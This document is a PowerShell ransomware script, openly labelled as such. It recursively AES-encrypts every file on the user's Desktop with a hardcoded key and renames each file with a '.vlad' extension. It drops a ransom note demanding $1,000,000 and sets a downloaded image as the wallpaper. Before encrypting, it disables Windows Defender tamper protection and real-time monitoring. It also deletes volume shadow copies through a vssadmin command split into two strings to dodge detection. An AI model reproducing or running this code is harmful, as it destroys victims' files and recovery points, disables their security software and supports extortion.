

# Function to encrypt a string using AES encryption
function Encrypt-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [string]$EncryptionKey
    )

    try {
        # Read file content as bytes
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)

        # Create AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        # Generate random IV
        $aes.GenerateIV()

        # Derive key from password
        $salt = [System.Text.Encoding]::UTF8.GetBytes("PowerShellAES")
        $keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($EncryptionKey, $salt, 10000)
        $aes.Key = $keyDerivation.GetBytes(32) # 256-bit key

        # Create encryptor
        $encryptor = $aes.CreateEncryptor()

        # Encrypt file bytes
        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)

        # Combine IV and encrypted data
        $combinedBytes = $aes.IV + $encryptedBytes

        # Write encrypted data back to file (or you can specify a new file)
        [System.IO.File]::WriteAllBytes($FilePath, $combinedBytes)
        

        # Clean up
        $encryptor.Dispose()
        $aes.Dispose()
        $keyDerivation.Dispose()

        Write-Host "File encrypted successfully."
    }
    catch {
        Write-Error "File encryption failed: $($_.Exception.Message)"
    }
}

# Function to decrypt a string using AES decryption
function Decrypt-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [string]$EncryptionKey
    )

    try {
        # Read encrypted file content as bytes
        $combinedBytes = [System.IO.File]::ReadAllBytes($FilePath)

        # Create AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        # Extract IV (first 16 bytes)
        $ivSize = 16
        $aes.IV = $combinedBytes[0..($ivSize-1)]

        # Extract encrypted data (remaining bytes)
        $encryptedBytes = $combinedBytes[$ivSize..($combinedBytes.Length-1)]

        # Derive key from password
        $salt = [System.Text.Encoding]::UTF8.GetBytes("PowerShellAES")
        $keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($EncryptionKey, $salt, 10000)
        $aes.Key = $keyDerivation.GetBytes(32) # 256-bit key

        # Create decryptor
        $decryptor = $aes.CreateDecryptor()

        # Decrypt file bytes
        $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)

        # Write decrypted data back to file (or you can specify a new file)
        [System.IO.File]::WriteAllBytes($FilePath, $decryptedBytes)

        # Clean up
        $decryptor.Dispose()
        $aes.Dispose()
        $keyDerivation.Dispose()

        Write-Host "File decrypted successfully."
    }
    catch {
        Write-Error "File decryption failed: $($_.Exception.Message)"
    }
}
function main{
    param (
        [Parameter(Mandatory=$true)]
        [string] $TargetDirectory,
        [Parameter(Mandatory=$true)]
        [string] $EncKey
    )
    Invoke-WebRequest -Uri 'https://i.imgflip.com/a4oy3p.jpg' -OutFile "$env:USERPROFILE\Downloads\Wallpaper.jpg"
    $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
    foreach($file in $Target){
        Encrypt-File -FilePath $File -EncryptionKey $EncKey
        Rename-Item -Path $file -NewName $file+".vlad" -Force
        #Decrypt-File -FilePath $NewFileName -EncryptionKey $EncKey
    }
    try {
        New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File -ErrorAction Stop
        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000' -ErrorAction Stop
        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
    }
    catch {
        Remove-Item Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
        New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'Looks like you got got again! Pro tip: dont run the ransowmare script twice' -ErrorAction Stop
        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
    }
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
}

Set-MPPreference -DisableTamperProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
$path = "$env:USERPROFILE\Desktop"
$AS = "vssadmi"
$AZ = "n.exe delete shadows /all /quiet"
$AD = $AS + $AZ
Invoke-Expression $AD
main -TargetDirectory $path -EncKey 123 
Rundll32.exe user32.dll,UpdatePerUserSystemParameters
